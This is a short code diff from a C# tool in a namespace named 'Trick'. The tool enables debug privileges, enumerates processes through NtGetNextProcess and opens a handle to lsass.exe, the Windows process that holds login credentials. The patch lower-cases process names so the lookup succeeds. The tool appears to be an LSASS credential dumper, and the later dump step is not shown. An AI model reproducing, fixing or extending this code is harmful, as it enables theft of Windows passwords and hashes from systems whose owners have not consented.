@@ -192,7 +192,7 @@ namespace Trick
 
             while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
             {
-                string current_proc_name = GetProcNameFromHandle(aux_handle);
+                string current_proc_name = GetProcNameFromHandle(aux_handle).ToLower();
                 if (current_proc_name == proc_name)
                 {
                     return aux_handle;
@@ -247,7 +247,7 @@ namespace Trick
             EnableDebugPrivileges();
 
             // Get process handle
-            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
+            string proc_name = "c:\\windows\\system32\\lsass.exe";
             IntPtr processHandle = GetProcessByName(proc_name);
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
             if (processHandle == IntPtr.Zero)
